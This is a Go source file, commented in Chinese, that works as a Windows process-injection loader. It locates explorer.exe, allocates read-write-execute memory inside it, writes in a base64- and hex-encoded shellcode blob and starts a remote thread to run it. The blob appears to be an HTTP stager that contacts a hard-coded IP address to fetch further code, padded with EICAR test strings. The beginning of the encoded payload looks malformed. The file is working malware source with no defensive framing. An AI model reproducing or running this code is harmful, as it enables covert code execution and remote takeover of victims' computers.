package main

import (
	"encoding/base64"
	"encoding/hex"
	"fmt"
	"log"
	"os"
	"strings"
	"syscall"
	"unsafe"
)

const (
	PROCESS_ALL_ACCESS     = 0x1F0FFF //OpenProcess中的第一个参数，获取最大权限
	MEM_COMMIT             = 0x1000
	MEM_RESERVE            = 0x2000
	PAGE_EXECUTE_READWRITE = 0x40
)

var (
	inProcessName            = "explorer.exe" //需要注入的进程，可修改
	kernel32                 = syscall.NewLazyDLL("kernel32.dll")
	CreateToolhelp32Snapshot = kernel32.NewProc("CreateToolhelp32Snapshot")
	Process32Next            = kernel32.NewProc("Process32Next")
	CloseHandle              = kernel32.NewProc("CloseHandle")
	OpenProcess              = kernel32.NewProc("OpenProcess")
	VirtualAllocEx           = kernel32.NewProc("VirtualAllocEx")
	WriteProcessMemory       = kernel32.NewProc("WriteProcessMemory")
	CreateRemoteThreadEx     = kernel32.NewProc("CreateRemoteThreadEx")
	VirtualProtectEx         = kernel32.NewProc("VirtualProtectEx")
)

type ulong int32
type ulong_ptr uintptr
type PROCESSENTRY32 struct {
	dwSize              ulong
	cntUsage            ulong
	th32ProcessID       ulong
	th32DefaultHeapID   ulong_ptr
	th32ModuleID        ulong
	cntThreads          ulong
	th32ParentProcessID ulong
	pcPriClassBase      ulong
	dwFlags             ulong
	szExeFile           [260]byte
}

//根据进程名称获取进程pid
func GetPID() int {
	pHandle, _, _ := CreateToolhelp32Snapshot.Call(uintptr(0x2), uintptr(0x0))
	tasklist := make(map[string]int)
	var PID int
	if int(pHandle) == -1 {
		os.Exit(1)
	}
	//遍历所有进程，并保存至map
	for {
		var proc PROCESSENTRY32
		proc.dwSize = ulong(unsafe.Sizeof(proc))
		if rt, _, _ := Process32Next.Call(pHandle, uintptr(unsafe.Pointer(&proc))); int(rt) == 1 {
			ProcessName := string(proc.szExeFile[0:])
			//th32ModuleID := strconv.Itoa(int(proc.th32ModuleID))
			ProcessID := int(proc.th32ProcessID)
			tasklist[ProcessName] = ProcessID
		} else {
			break
		}
	}
	//从map中取出key为inProcessName的value
	for k, v := range tasklist {
		if strings.Contains(k, inProcessName) == true {
			PID = v
		}
	}
	_, _, _ = CloseHandle.Call(pHandle)

	return PID
}

//对base64编码的shellcode进行处理
func GetShellCode(b64body string) []byte {
	shellCodeB64, err := base64.StdEncoding.DecodeString(b64body)
	if err != nil {
		fmt.Printf("[!]Error b64decoding string : %s ", err.Error())
		os.Exit(1)
	}
	//转换处理
	shellcodeHex, _ := hex.DecodeString(strings.ReplaceAll(strings.ReplaceAll(string(shellCodeB64), "\n", ""), "\\x", ""))
	return shellcodeHex
}

//根据pid获取句柄
func GetOpenProcess(dwProcessId int) uintptr {
	pHandle, _, _ := OpenProcess.Call(uintptr(PROCESS_ALL_ACCESS), uintptr(0), uintptr(dwProcessId))
	return pHandle
}

//开辟内存空间执行shellcode
func injectProcessAndEx(pHandle uintptr, shellcode []byte) {
	Protect := PAGE_EXECUTE_READWRITE
	addr, _, err := VirtualAllocEx.Call(uintptr(pHandle), 0, uintptr(len(shellcode)), MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE)
	if err != nil && err.Error() != "The operation completed successfully." {
		log.Fatal(fmt.Sprintf("[!]Error calling VirtualAlloc:\r\n%s", err.Error()))
	}

	WriteProcessMemory.Call(uintptr(pHandle), addr, (uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))
	VirtualProtectEx.Call(uintptr(pHandle), addr, uintptr(len(shellcode)), PAGE_EXECUTE_READWRITE, uintptr(unsafe.Pointer(&Protect)))
	CreateRemoteThreadEx.Call(uintptr(pHandle), 0, 0, addr, 0, 0, 0)
}

func main() {
	b64body := "DQxXHgwMVx4YzDBceDAwXHXHgzNFx4ODhceDQ4XHgwMVx4ZDZceDRkXHgzMVx4YzlceDQ4I0XHgwOFx4NDVceDM5XHhkMVx4NzVceGQ4XHg1OFx4NDRceDhiXHg0MFx4MjRceDQ5XHgwMVx4ZDBceDY2XHg0MVx4OGJceDBjXHg0OFx4NDRceDhiXHg0MFx4MWNceDQ5XHgwMVx4ZDBceDQxXHg4Ylx4MDRceDg4XHg0OFx4MDFceGQwXHg0MVx4NThceDQxXHg1OFx4NWVceDU5XHg1YVx4NDFceDU4XHg0MVx4NTlceDQxXHg1YVx4NDhceDgzXHhlY1x4MjBceDQxXHg1Mlx4ZmZceGUwXHg1OFx4NDFceDU5XHg1YVx4NDhceDhiXHgxMlx4ZTlceDRmXHhmZlx4ZmZceGZmXHg1ZFx4NmFceDAwXHg0OVx4YmVceDc3XHg2OVx4NmVceDY5XHg2ZVx4NjVceDc0XHgwMFx4NDFceDU2XHg0OVx4ODlceGU2XHg0Y1x4ODlceGYxXHg0MVx4YmFceDRjXHg3N1x4MjZceDA3XHhmZlx4ZDVceDQ4XHgzMVx4YzlceDQ4XHgzMVx4ZDJceDRkXHgzMVx4YzBceDRkXHgzMVx4YzlceDQxXHg1MFx4NDFceDUwXHg0MVx4YmFceDNhXHg1Nlx4NzlceGE3XHhmZlx4ZDVceGViXHg3M1x4NWFceDQ4XHg4OVx4YzFceDQxXHhiOFx4NTBceDAwXHgwMFx4MDBceDRkXHgzMVx4YzlceDQxXHg1MVx4NDFceDUxXHg2YVx4MDNceDQxXHg1MVx4NDFceGJhXHg1N1x4ODlceDlmXHhjNlx4ZmZceGQ1XHhlYlx4NTlceDViXHg0OFx4ODlceGMxXHg0OFx4MzFceGQyXHg0OVx4ODlceGQ4XHg0ZFx4MzFceGM5XHg1Mlx4NjhceDAwXHgwMlx4NDBceDg0XHg1Mlx4NTJceDQxXHhiYVx4ZWJceDU1XHgyZVx4M2JceGZmXHhkNVx4NDhceDg5XHhjNlx4NDhceDgzXHhjM1x4NTBceDZhXHgwYVx4NWZceDQ4XHg4OVx4ZjFceDQ4XHg4OVx4ZGFceDQ5XHhjN1x4YzBceGZmXHhmZlx4ZmZceGZmXHg0ZFx4MzFceGM5XHg1Mlx4NTJceDQxXHhiYVx4MmRceDA2XHgxOFx4N2JceGZmXHhkNVx4ODVceGMwXHgwZlx4ODVceDlkXHgwMVx4MDBceDAwXHg0OFx4ZmZceGNmXHgwZlx4ODRceDhjXHgwMVx4MDBceDAwXHhlYlx4ZDNceGU5XHhlNFx4MDFceDAwXHgwMFx4ZThceGEyXHhmZlx4ZmZceGZmXHgyZlx4NzNceDQ0XHg0ZFx4NTlceDAwXHgzNVx4NGZceDIxXHg1MFx4MjVceDQwXHg0MVx4NTBceDViXHgzNFx4NWNceDUwXHg1YVx4NThceDM1XHgzNFx4MjhceDUwXHg1ZVx4MjlceDM3XHg0M1x4NDNceDI5XHgzN1x4N2RceDI0XHg0NVx4NDlceDQzXHg0MVx4NTJceDJkXHg1M1x4NTRceDQxXHg0ZVx4NDRceDQxXHg1Mlx4NDRceDJkXHg0MVx4NGVceDU0XHg0OVx4NTZceDQ5XHg1Mlx4NTVceDUzXHgyZFx4NTRceDQ1XHg1M1x4NTRceDJkXHg0Nlx4NDlceDRjXHg0NVx4MjFceDI0XHg0OFx4MmJceDQ4XHgyYVx4MDBceDM1XHg0Zlx4MjFceDUwXHgyNVx4MDBceDU1XHg3M1x4NjVceDcyXHgyZFx4NDFceDY3XHg2NVx4NmVceDc0XHgzYVx4MjBceDRkXHg2Zlx4N2FceDY5XHg2Y1x4NmNceDYxXHgyZlx4MzVceDJlXHgzMFx4MjBceDI4XHg2M1x4NmZceDZkXHg3MFx4NjFceDc0XHg2OVx4NjJceDZjXHg2NVx4M2JceDIwXHg0ZFx4NTNceDQ5XHg0NVx4MjBceDM5XHgyZVx4MzBceDNiXHgyMFx4NTdceDY5XHg2ZVx4NjRceDZmXHg3N1x4NzNceDIwXHg0ZVx4NTRceDIwXHgzNlx4MmVceDMxXHgzYlx4MjBceDU3XHg0Zlx4NTdceDM2XHgzNFx4M2JceDIwXHg1NFx4NzJceDY5XHg2NFx4NjVceDZlXHg3NFx4MmZceDM1XHgyZVx4MzBceDNiXHgyMFx4NDJceDRmXHg0OVx4NDVceDM5XHgzYlx4NDVceDRlXHg1NVx4NTNceDI5XHgwZFx4MGFceDAwXHgzNVx4NGZceDIxXHg1MFx4MjVceDQwXHg0MVx4NTBceDViXHgzNFx4NWNceDUwXHg1YVx4NThceDM1XHgzNFx4MjhceDUwXHg1ZVx4MjlceDM3XHg0M1x4NDNceDI5XHgzN1x4N2RceDI0XHg0NVx4NDlceDQzXHg0MVx4NTJceDJkXHg1M1x4NTRceDQxXHg0ZVx4NDRceDQxXHg1Mlx4NDRceDJkXHg0MVx4NGVceDU0XHg0OVx4NTZceDQ5XHg1Mlx4NTVceDUzXHgyZFx4NTRceDQ1XHg1M1x4NTRceDJkXHg0Nlx4NDlceDRjXHg0NVx4MjFceDI0XHg0OFx4MmJceDQ4XHgyYVx4MDBceDM1XHg0Zlx4MjFceDUwXHgyNVx4NDBceDQxXHg1MFx4NWJceDM0XHg1Y1x4NTBceDVhXHg1OFx4MzVceDM0XHgyOFx4NTBceDVlXHgyOVx4MzdceDQzXHg0M1x4MjlceDM3XHg3ZFx4MjRceDQ1XHg0OVx4NDNceDQxXHg1Mlx4MmRceDUzXHg1NFx4NDFceDRlXHg0NFx4NDFceDUyXHg0NFx4MmRceDQxXHg0ZVx4NTRceDQ5XHg1Nlx4NDlceDUyXHg1NVx4NTNceDJkXHg1NFx4NDVceDUzXHg1NFx4MmRceDQ2XHg0OVx4NGNceDQ1XHgyMVx4MjRceDQ4XHgyYlx4NDhceDJhXHgwMFx4MzVceDRmXHgyMVx4NTBceDI1XHg0MFx4NDFceDUwXHg1Ylx4MzRceDVjXHg1MFx4NWFceDU4XHgzNVx4MzRceDI4XHg1MFx4NWVceDI5XHgzN1x4NDNceDQzXHgyOVx4MzdceDdkXHgyNFx4NDVceDQ5XHg0M1x4NDFceDUyXHgyZFx4NTNceDU0XHg0MVx4NGVceDQ0XHg0MVx4NTJceDQ0XHgyZFx4NDFceDRlXHg1NFx4NDlceDU2XHg0OVx4NTJceDU1XHg1M1x4MmRceDU0XHg0NVx4NTNceDU0XHgyZFx4NDZceDQ5XHg0Y1x4NDVceDIxXHgyNFx4NDhceDJiXHg0OFx4MmFceDAwXHgzNVx4NGZceDAwXHg0MVx4YmVceGYwXHhiNVx4YTJceDU2XHhmZlx4ZDVceDQ4XHgzMVx4YzlceGJhXHgwMFx4MDBceDQwXHgwMFx4NDFceGI4XHgwMFx4MTBceDAwXHgwMFx4NDFceGI5XHg0MFx4MDBceDAwXHgwMFx4NDFceGJhXHg1OFx4YTRceDUzXHhlNVx4ZmZceGQ1XHg0OFx4OTNceDUzXHg1M1x4NDhceDg5XHhlN1x4NDhceDg5XHhmMVx4NDhceDg5XHhkYVx4NDFceGI4XHgwMFx4MjBceDAwXHgwMFx4NDlceDg5XHhmOVx4NDFceGJhXHgxMlx4OTZceDg5XHhlMlx4ZmZceGQ1XHg0OFx4ODNceGM0XHgyMFx4ODVceGMwXHg3NFx4YjZceDY2XHg4Ylx4MDdceDQ4XHgwMVx4YzNceDg1XHhjMFx4NzVceGQ3XHg1OFx4NThceDU4XHg0OFx4MDVceDAwXHgwMFx4MDBceDAwXHg1MFx4YzNceGU4XHg5Zlx4ZmRceGZmXHhmZlx4MzFceDM5XHgzMlx4MmVceDMxXHgzNlx4MzhceDJlXHgzMlx4MzJceDM4XHgyZVx4MzFceDMyXHgzOVx4MDBceDAwXHgwMFx4MDBceDAw"
	dwProcessId := GetPID()
	pHandle := GetOpenProcess(dwProcessId)
	shellCodeHex := GetShellCode(b64body)
	injectProcessAndEx(pHandle, shellCodeHex)
}
